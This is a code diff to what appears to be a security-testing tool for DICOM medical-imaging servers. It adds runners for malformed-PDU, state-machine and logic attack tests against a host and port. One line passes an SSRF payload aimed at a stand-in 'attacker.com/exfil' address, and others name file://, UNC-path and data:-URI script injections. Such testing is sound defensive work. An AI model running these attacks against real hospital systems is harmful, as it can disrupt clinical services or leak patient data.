@@ -393,6 +393,152 @@ def run_parser_attacks(args) -> int:
     return 0
 
 
+def run_protocol_attacks(args) -> int:
+    """Run protocol-level attack tests."""
+    if not args.target:
+        print("ERROR: --target required for protocol attacks (format: host:port)")
+        return 1
+    
+    print("\n=== Protocol Attacks ===\n")
+    
+    # These are static protocol malformations - don't need live connection
+    attacks = [
+        ("Malformed protocol version", lambda: ProtocolAttacks.malformed_protocol_version(0xFFFF)),
+        ("Oversized PDU", lambda: ProtocolAttacks.oversized_pdu(0x100000)),
+        ("Undersized PDU", ProtocolAttacks.undersized_pdu),
+        ("Invalid PDU type", lambda: ProtocolAttacks.invalid_pdu_type(0xFF)),
+        ("Truncated association", ProtocolAttacks.truncated_association),
+        ("P-DATA without association", ProtocolAttacks.pdata_without_association),
+        ("Overlong AE title", ProtocolAttacks.overlong_ae_title),
+        ("Null AE titles", ProtocolAttacks.null_ae_titles),
+        ("Missing application context", ProtocolAttacks.missing_application_context),
+        ("PDU length mismatch", lambda: ProtocolAttacks.pdu_length_mismatch(10000)),
+        ("Wrong context ID", lambda: ProtocolAttacks.wrong_context_id(255)),
+    ]
+    
+    results = []
+    for name, attack_fn in attacks:
+        try:
+            payload = attack_fn()
+            result = AttackResult(
+                name=name.lower().replace(' ', '_'),
+                category='protocol',
+                payload=payload,
+                description=name,
+                expected_behavior='Parser should handle malformed protocol',
+            )
+            print_result(result, args.verbose)
+            results.append(result)
+        except Exception as e:
+            print(f"✗ {name}: {e}")
+    
+    print(f"\nTotal protocol attack tests: {len(results)}")
+    
+    if args.output:
+        os.makedirs(args.output, exist_ok=True)
+        for result in results:
+            filename = f"{result.name}.bin"
+            filepath = os.path.join(args.output, filename)
+            with open(filepath, 'wb') as f:
+                f.write(result.payload)
+    
+    return 0
+
+
+def run_logic_attacks(args) -> int:
+    """Run logic attack tests."""
+    print("\n=== Logic Attacks ===\n")
+    
+    attacks = [
+        ("Transfer syntax mismatch", LogicAttacks.transfer_syntax_mismatch),
+        ("SOP class mismatch", LogicAttacks.sop_class_mismatch),
+        ("Private creator missing", LogicAttacks.private_creator_missing),
+        ("URI SSRF", lambda: LogicAttacks.uri_ssrf('http://attacker.com/exfil')),
+        ("file:// URI injection", LogicAttacks.file_uri_injection),
+        ("UNC path injection", LogicAttacks.unc_path_injection),
+        ("data: URI script", LogicAttacks.data_uri_script),
+    ]
+    
+    results = []
+    for name, attack_fn in attacks:
+        try:
+            result = attack_fn()
+            print_result(result, args.verbose)
+            results.append(result)
+        except Exception as e:
+            print(f"✗ {name}: {e}")
+    
+    print(f"\nTotal logic attack tests: {len(results)}")
+    
+    if args.output:
+        os.makedirs(args.output, exist_ok=True)
+        for result in results:
+            filename = f"{result.name}.dcm"
+            filepath = os.path.join(args.output, filename)
+            
+            # Add DICOM file wrapper if not already present
+            if not result.payload.startswith(b'DICM'):
+                file_data = b'\x00' * 128 + b'DICM' + result.payload
+            else:
+                file_data = result.payload
+            
+            with open(filepath, 'wb') as f:
+                f.write(file_data)
+    
+    return 0
+
+
+def run_state_machine_attacks(args) -> int:
+    """Run state machine attack tests."""
+    if not args.target:
+        print("ERROR: --target required for state machine attacks (format: host:port)")
+        print("Example: python -m c_scare state_machine_attacks --target 127.0.0.1:4242")
+        return 1
+    
+    print("\n=== State Machine Attacks ===\n")
+    
+    # Parse target
+    try:
+        host, port = args.target.rsplit(':', 1)
+        port = int(port)
+        target = (host, port)
+    except ValueError:
+        print(f"ERROR: Invalid target format: {args.target}")
+        print("Expected format: host:port (e.g., 192.168.1.100:11112)")
+        return 1
+    
+    print(f"Target: {host}:{port}")
+    print()
+    
+    try:
+        state_attacks = StateMachineAttacks(target)
+        
+        attacks = [
+            ("P-DATA before association", state_attacks.pdata_before_assoc),
+            ("A-RELEASE before association", state_attacks.release_before_assoc),
+            ("Double association", state_attacks.double_association),
+            ("A-RELEASE then P-DATA", state_attacks.release_then_pdata),
+            ("Incomplete fragment", state_attacks.incomplete_fragment),
+        ]
+        
+        results = []
+        for name, attack_fn in attacks:
+            try:
+                result = attack_fn()
+                print_result(result, args.verbose)
+                results.append(result)
+            except Exception as e:
+                print(f"✗ {name}: {e}")
+        
+        print(f"\nTotal state machine attack tests: {len(results)}")
+        
+    except Exception as e:
+        print(f"ERROR: State machine attacks failed: {e}")
+        return 1
+    
+    return 0
+
+
 def run_memory_attacks(args) -> int:
     """Run memory corruption attack tests."""
     print("\n=== Memory Attacks ===\n")
@@ -447,7 +593,9 @@ def run_all_tests(args) -> int:
     commands = [
         ('CVE Attacks', run_cve_attacks),
         ('Parser Attacks', run_parser_attacks),
+        ('Protocol Attacks', run_protocol_attacks),
         ('Memory Attacks', run_memory_attacks),
+        ('Logic Attacks', run_logic_attacks),
         ('Fuzz Packets', run_fuzz_packets),
     ]
     
@@ -480,9 +628,12 @@ def run_command(command: str, args) -> int:
         'cve_attacks': run_cve_attacks,
         'fuzz_packets': run_fuzz_packets,
         'protocol_fuzzing': run_protocol_fuzzing,
+        'protocol_attacks': run_protocol_attacks,
         'generate_corpus': run_generate_corpus,
         'parser_attacks': run_parser_attacks,
         'memory_attacks': run_memory_attacks,
+        'logic_attacks': run_logic_attacks,
+        'state_machine_attacks': run_state_machine_attacks,
         'all': run_all_tests,
     }
     
@@ -502,13 +653,36 @@ def main(argv: Optional[List[str]] = None):
         epilog=__doc__
     )
     
+    # Connection parameters (matching GitHub Actions workflow)
     parser.add_argument(
-        'command',
-        choices=['cve_attacks', 'fuzz_packets', 'protocol_fuzzing', 
-                 'generate_corpus', 'parser_attacks', 'memory_attacks', 'all'],
-        help='Command to run'
+        '--ip',
+        default='127.0.0.1',
+        help='Target IP address (default: 127.0.0.1)'
     )
     
+    parser.add_argument(
+        '--port',
+        type=int,
+        default=11112,
+        help='Target port (default: 11112)'
+    )
+    
+    parser.add_argument(
+        '--ae-title',
+        dest='ae_title',
+        default='ANY-SCP',
+        help='Called AE title (default: ANY-SCP)'
+    )
+    
+    # Test selection
+    parser.add_argument(
+        '--category',
+        choices=['parser', 'protocol', 'memory', 'logic', 'state_machine', 
+                 'cve', 'fuzz_packet', 'live_fuzz', 'all'],
+        help='Test category to run (if not specified, runs all)'
+    )
+    
+    # Additional options
     parser.add_argument(
         '-o', '--output',
         help='Output directory for generated files'
@@ -521,28 +695,57 @@ def main(argv: Optional[List[str]] = None):
     )
     
     parser.add_argument(
-        '-c', '--count',
-        type=int,
-        default=10,
-        help='Number of test cases to generate (default: 10)'
-    )
-    
-    parser.add_argument(
-        '-t', '--target',
-        help='Target for protocol fuzzing (format: host:port)'
-    )
-    
-    parser.add_argument(
         '--timeout',
         type=float,
-        default=5.0,
-        help='Timeout for network operations (default: 5.0)'
+        default=10.0,
+        help='Timeout for network operations (default: 10.0)'
+    )
+    
+    parser.add_argument(
+        '--live-fuzz-count',
+        type=int,
+        default=10,
+        help='Number of live fuzz iterations (default: 10)'
+    )
+    
+    parser.add_argument(
+        '--generate-corpus',
+        metavar='DIR',
+        help='Generate fuzzing corpus in specified directory'
     )
     
     args = parser.parse_args(argv)
     
+    # Build target string
+    args.target = f"{args.ip}:{args.port}"
+    args.count = args.live_fuzz_count
+    
+    # Map category to command
+    category_map = {
+        'parser': 'parser_attacks',
+        'protocol': 'protocol_attacks',
+        'memory': 'memory_attacks',
+        'logic': 'logic_attacks',
+        'state_machine': 'state_machine_attacks',
+        'cve': 'cve_attacks',
+        'fuzz_packet': 'fuzz_packets',
+        'live_fuzz': 'protocol_fuzzing',
+        'all': 'all',
+    }
+    
+    # Handle corpus generation
+    if args.generate_corpus:
+        args.output = args.generate_corpus
+        return run_command('generate_corpus', args)
+    
+    # Determine command from category
+    if args.category:
+        command = category_map.get(args.category, 'all')
+    else:
+        command = 'all'
+    
     try:
-        return run_command(args.command, args)
+        return run_command(command, args)
     except KeyboardInterrupt:
         print("\nInterrupted by user")
         return 130
